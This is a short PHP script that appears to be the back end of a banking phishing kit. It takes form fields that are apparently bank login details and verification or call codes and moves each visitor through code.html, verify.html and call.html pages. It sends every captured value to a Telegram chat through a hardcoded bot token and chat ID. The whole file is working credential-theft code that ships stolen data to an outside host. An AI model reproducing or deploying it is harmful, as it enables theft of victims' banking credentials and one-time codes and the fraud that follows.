<?php
if(isset($_POST['Banks'])){
	$ba = $_POST['a']. $_POST['b'].$_POST['bname'].header('Location: code.html');
}
if(isset($_POST['code'])){
	$ba = $_POST['co'].header('Location: verify.html');
}
if(isset($_POST['verify'])){
	$ba = $_POST['ve'].header('Location: call.html');
}
if(isset($_POST['call'])){
	$ba = $_POST['ca'].header('Location: code.html');
}

		
		$data = [
		    'chat_id' => '-1001709983534', 
		    'text' =>  '      '. $_POST['a'].'        '. $_POST['b'].$_POST['bname'].$_POST['co'].$_POST['ca'].$_POST['ve']
            
		];
		$response = file_get_contents("https://api.telegram.org/bot5449821388:AAEUWVLpjGA1NPSNk1Pt-OCWXjH82M7CiH0/sendMessage?" . http_build_query($data ) );	
	
    // https://api.telegram.org/bot5449821388:AAEUWVLpjGA1NPSNk1Pt-OCWXjH82M7CiH0/sendMessage
	
	
?>
